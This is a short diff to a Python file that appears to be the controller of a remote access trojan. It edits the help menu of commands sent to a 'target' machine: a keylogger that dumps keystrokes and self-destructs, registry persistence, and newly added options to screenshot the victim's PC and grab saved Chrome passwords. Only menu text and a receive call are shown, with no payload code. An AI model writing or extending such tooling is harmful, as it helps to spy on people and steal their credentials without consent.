@@ -78,7 +78,10 @@ def target_communication():
                 keylog_start                        --> Start The Keylogger
                 keylog_dump                         --> Print Keystrokes That The Target Inputted
                 keylog_stop                         --> Stop And Self Destruct Keylogger File
-                persistence *RegName* *fileName*    --> Create Persistence In Registry''', 'green'))
+                persistence *RegName* *fileName*    --> Create Persistence In Registry
+		screenshot                          --> screenshoot the target's PC
+		grabchrome                          --> grab chrome passwords
+		''', 'green'))
         else:
             result = reliable_recv()
             print(result)
